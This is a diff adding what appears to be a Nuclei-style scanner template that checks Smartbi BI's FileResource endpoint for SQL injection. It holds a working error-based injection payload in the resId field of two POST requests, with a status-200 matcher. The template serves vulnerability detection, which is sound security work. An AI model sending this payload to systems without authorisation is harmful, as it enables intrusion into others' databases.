@@ -1,0 +1,32 @@
+id: yaml-poc-smartbi-smartbi_bi-sql_injection-CT-529826
+info:
+  name: Yaml Poc Smartbi Smartbi_Bi Sql_Injection Ct 529826
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-smartbi-smartbi_bi-sql_injection-CT-529826'
+  tags: sqli
+  reference:
+  - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
+http:
+- method: POST
+  path:
+  - /vision/FileResource
+  body: op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /smartbi/vision/FileResource
+  body: op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
